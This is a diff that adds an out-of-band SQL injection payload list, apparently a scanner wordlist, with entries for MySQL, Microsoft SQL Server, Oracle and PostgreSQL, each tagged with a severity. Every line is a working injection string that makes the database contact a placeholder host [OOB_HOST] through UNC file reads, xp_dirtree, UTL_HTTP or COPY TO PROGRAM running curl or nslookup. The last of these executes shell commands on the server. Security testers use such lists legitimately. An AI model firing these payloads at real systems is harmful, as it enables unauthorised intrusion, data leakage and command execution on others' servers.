@@ -1,0 +1,24 @@
+' OR LOAD_FILE(CONCAT('\\\\','[OOB_HOST]','\\a')) OR 'vun'='vun::: OOB-SQLi::: High::: MySQL
+" OR LOAD_FILE(CONCAT('\\\\','[OOB_HOST]','\\a')) OR "vun"="vun::: OOB-SQLi::: High::: MySQL
+ OR LOAD_FILE(CONCAT('\\\\','[OOB_HOST]','\\a')) -- ::: OOB-SQLi::: High::: MySQL
+')) AND LOAD_FILE(CONCAT('\\\\','[OOB_HOST]','\\a')) AND ((1=1::: OOB-SQLi::: High::: MySQL
+' OR (SELECT LOAD_FILE(CONCAT('\\\\','[OOB_HOST]','\\a'))) OR 'vun'='vun::: OOB-SQLi::: High::: MySQL
+
+'; EXEC master..xp_dirtree '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+"; EXEC master..xp_dirtree '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+; EXEC master..xp_dirtree '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+')) ; EXEC master..xp_dirtree '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+'; EXEC master..xp_fileexist '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+"; EXEC master..xp_fileexist '\\[OOB_HOST]\a'; -- ::: OOB-SQLi::: High::: Microsoft SQL Server
+
+' OR UTL_INADDR.GET_HOST_ADDRESS('[OOB_HOST]')=1 -- ::: OOB-SQLi::: High::: Oracle
+" OR UTL_INADDR.GET_HOST_ADDRESS('[OOB_HOST]')=1 -- ::: OOB-SQLi::: High::: Oracle
+ AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('[OOB_HOST]') FROM DUAL) IS NOT NULL -- ::: OOB-SQLi::: High::: Oracle
+')) AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('[OOB_HOST]') FROM DUAL) IS NOT NULL AND ((1=1::: OOB-SQLi::: High::: Oracle
+' OR (SELECT HTTPURITYPE('http://[OOB_HOST]').GETCLOB() FROM DUAL) IS NOT NULL -- ::: OOB-SQLi::: High::: Oracle
+" OR (SELECT UTL_HTTP.REQUEST('http://[OOB_HOST]') FROM DUAL) IS NOT NULL -- ::: OOB-SQLi::: High::: Oracle
+
+'; COPY (SELECT 1) TO PROGRAM 'nslookup [OOB_HOST]'; -- ::: OOB-SQLi::: High::: PostgreSQL
+"; COPY (SELECT 1) TO PROGRAM 'nslookup [OOB_HOST]'; -- ::: OOB-SQLi::: High::: PostgreSQL
+); COPY (SELECT 1) TO PROGRAM 'curl http://[OOB_HOST]'; -- ::: OOB-SQLi::: High::: PostgreSQL
+')); COPY (SELECT 1) TO PROGRAM 'curl http://[OOB_HOST]'; -- ::: OOB-SQLi::: High::: PostgreSQL
